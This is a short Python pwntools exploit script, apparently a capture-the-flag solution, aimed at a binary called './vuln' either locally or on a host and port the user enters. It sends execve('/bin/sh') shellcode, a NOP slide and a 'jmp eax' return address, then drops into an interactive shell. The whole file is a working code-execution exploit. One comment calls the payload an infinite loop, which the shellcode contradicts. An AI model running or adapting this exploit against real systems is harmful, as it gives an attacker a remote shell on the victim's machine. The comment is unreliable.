from pwn import *

binary = './vuln'



elf = ELF(binary , checksec=False)
rop = ROP(elf)

print("Type [y/n]:")
print("y -> server exploitation")
print("n -> local exploitation")
exploit = True if (input(">>>").lower() == 'y') else False

if(exploit):
	HOST = input("Enter Hostname:")
	PORT = input("Enter Port no:")
	io = remote(HOST,PORT)
else:
	io = process(binary)


### This payload creates a infinte loop.
total_bytes = 28
jmp_eax = 0x0805333b # jmp  eax

shellcode = (
    b"\x31\xc0"                  # xor    eax,eax
    b"\x68\x2f\x73\x68\x00"      # push   0x68732f
    b"\x68\x2f\x62\x69\x6e"      # push   0x6e69622f
    b"\x89\xe3"                  # mov    ebx,esp
    b"\x31\xc9"                  # xor    ecx,ecx
    b"\x31\xd2"                  # xor    edx,edx
    b"\xb0\x0b"                  # mov    al,0xb
    b"\xcd\x80"                  # int    0x80
)

shellcode_bytes = len(shellcode)

nop_slide = b'\x90' * (total_bytes - shellcode_bytes)


io.recvline()
io.sendline(shellcode + nop_slide + p32(jmp_eax))
io.interactive()
